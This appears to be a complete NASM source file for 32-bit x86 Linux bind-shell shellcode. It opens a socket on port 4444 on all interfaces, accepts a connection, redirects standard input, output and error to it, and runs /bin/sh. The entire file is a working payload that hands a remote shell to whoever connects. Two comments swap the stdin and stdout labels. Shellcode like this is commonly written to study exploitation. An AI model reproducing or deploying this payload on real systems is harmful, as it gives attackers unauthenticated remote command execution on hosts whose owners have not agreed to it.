; shell_bind_tcp.nasm
; Author: Michael Norris

global _start

section .text
_start:
    ; clear registers
    xor edx, edx
    xor ecx, ecx
    xor ebx, ebx
    xor eax, eax

    ; int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    push edx            ; 0
    push 0x1            ; 1 = SOCK_STREAM
    push 0x2            ; 2 = AF_INET
    mov ecx, esp        ; *args
    inc bl              ; 1 = sys_socket
    mov al, 0x66        ; socketcall
    int 0x80            ; returns int sockfd in eax
    mov esi, eax        ; store int sockfd in esi

    ; struct sockaddr_in addr;
    push edx            ; addr.sin_addr.s_addr = 0 = INADDR_ANY;
    push word 0x5c11    ; addr.sin_port = htons(4444);
    push word 0x2       ; addr.sin_family = 2 = AF_INET;
    mov ecx, esp        ; pointer to struct sockaddr_in addr;

    ; bind(sockfd, (struct sockaddr *)&addr, sizeof(addr));
    push 0x10           ; 16 = sizeof(addr)
    push ecx            ; (struct sockaddr *)&addr
    push esi            ; sockfd
    mov ecx, esp        ; *args
    inc bl              ; 2 = sys_bind
    mov al, 0x66        ; socketcall   
    int 0x80            ; returns 0 in eax

    ; listen(sockfd, 0);
    push edx            ; 0
    push esi            ; sockfd
    mov ecx, esp        ; *args
    mov bl, 0x4         ; 4 = sys_listen
    mov al, 0x66        ; socketcall
    int 0x80            ; returns 0 in eax

    ; int connfd = accept(sockfd, NULL, NULL);
    push edx            ; NULL
    push edx            ; NULL
    push esi            ; sockfd
    mov ecx, esp        ; *args
    inc bl              ; 5 = sys_accept
    mov al, 0x66        ; socketcall
    int 0x80            ; returns int connfd in eax

    ; int dup2(int oldfd, int newfd);
    mov ecx, edx        ; 0 = STDOUT
    mov ebx, eax        ; store int connfd in ebx
    mov al, 0x3f        ; dup2
    int 0x80
    inc cl              ; 1 = STDIN
    mov al, 0x3f        ; dup2
    int 0x80
    inc cl              ; 2 = STDERROR
    mov al, 0x3f        ; dup2
    int 0x80

    ; execve("/bin/sh", NULL, NULL);
    push edx            ; delimiting NULL for pathname
    push 0x68732f2f     ; //sh
    push 0x6e69622f     ; /bin
    mov ebx, esp        ; pointer to pathname
    push edx            ; delimiting NULL for argv[] & envp[]
    mov edx, esp        ; *const envp[]
    push ebx            ; *pathname
    mov ecx, esp        ; *const argv[]
    mov al, 0xb         ; execve
    int 0x80
